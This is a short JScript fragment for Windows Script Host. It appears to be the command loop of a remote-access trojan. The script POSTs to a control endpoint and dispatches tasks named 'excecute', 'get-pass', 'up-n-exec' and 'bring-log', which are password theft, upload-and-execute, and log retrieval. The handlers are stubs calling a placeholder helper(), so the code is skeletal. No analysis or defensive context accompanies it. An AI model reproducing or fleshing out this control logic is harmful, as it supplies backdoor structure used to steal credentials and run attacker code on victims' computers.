var transport = WScript.CreateObject("msxml2.xmlhttp");
transport.open("POST", endpoint, false); transport.send("");
switch (task) {
case "excecute": print(payload); break;
case "get-pass": helper(); break;
case "up-n-exec": helper(); break;
case "bring-log": helper(); break;
}
